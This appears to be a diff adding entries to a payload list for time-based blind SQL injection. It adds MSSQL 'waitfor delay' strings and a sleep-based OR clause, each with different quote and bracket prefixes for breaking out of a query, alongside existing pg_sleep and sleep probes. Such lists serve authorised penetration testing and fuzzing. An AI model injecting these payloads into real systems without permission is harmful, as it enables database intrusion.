@@ -16,3 +16,11 @@ if(now()=sysdate(),sleep(3),0)
 %';SELECT PG_SLEEP(5)--
 pg_sleep(10)
 '| |pg_sleep(10)--
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
